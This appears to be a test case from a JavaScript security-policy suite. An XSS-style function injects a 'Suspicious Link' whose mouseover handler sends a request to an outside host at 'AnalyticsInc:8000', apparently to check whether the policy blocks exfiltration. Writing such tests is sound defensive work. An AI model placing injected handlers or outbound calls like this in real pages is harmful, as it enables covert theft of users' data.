// exfil_test_xss5.js
function exfiltrate_key_history() {
  var URL = JAM.call(Function, null, ['xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss5",true);xmlhttp.send(null);']);
  var script = document.createElement("a");
  JAM.set(script, "onmouseover", URL);
  JAM.set(script, "innerHTML", "Suspicious Link");
  var v2 = document.getElementsByTagName("body");
  introspect(JAM.policy.p1) {
    var v0 = v2[0]
  }
  JAM.call(v0.appendChild, v0, [script]);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
